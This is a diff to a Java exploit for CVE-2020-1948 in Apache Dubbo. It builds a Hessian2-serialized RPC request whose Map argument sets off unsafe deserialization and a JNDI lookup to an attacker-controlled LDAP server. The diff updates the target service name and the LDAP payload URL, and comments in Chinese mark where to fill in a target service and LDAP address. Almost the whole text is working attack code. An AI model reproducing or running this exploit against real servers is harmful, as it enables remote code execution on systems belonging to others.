@@ -7,7 +7,7 @@ import marshalsec.util.Reflections;
 import org.apache.dubbo.common.io.Bytes;
 import org.apache.dubbo.common.serialize.Cleanable;
 import org.apache.dubbo.serialize.hessian.Hessian2ObjectOutput;
-
+import org.apache.dubbo.rpc.RpcInvocation;
 import java.io.ByteArrayOutputStream;
 import java.io.OutputStream;
 import java.lang.reflect.Array;
@@ -74,13 +74,13 @@ public class CVE_2020_1948 {
 
         hessian2ObjectOutput.writeUTF("2.7.6");
 //todo 此处填写注册中心获取到的service全限定名、版本号、方法名
-        hessian2ObjectOutput.writeUTF("com.example.api.DemoService");//provider的接口全限定名
+        hessian2ObjectOutput.writeUTF("com.pacemrc.dubbo.api.DemoService");//provider的接口全限定名
         hessian2ObjectOutput.writeUTF("");//接口版本
         hessian2ObjectOutput.writeUTF("sayHello");//接口方法
 //todo 方法描述不需要修改，因为此处需要指定map的payload去触发
         hessian2ObjectOutput.writeUTF("Ljava/util/Map;");//接口方法的参数类型？
 //todo 此处填写ldap url
-        setPayload(hessian2ObjectOutput,"ldap://10.72.160.176:1389/4seux3");
+        setPayload(hessian2ObjectOutput,"ldap://10.58.120.200:1389/nco5cx");
         hessian2ObjectOutput.writeObject(new HashMap());
 
         hessian2ObjectOutput.flushBuffer();
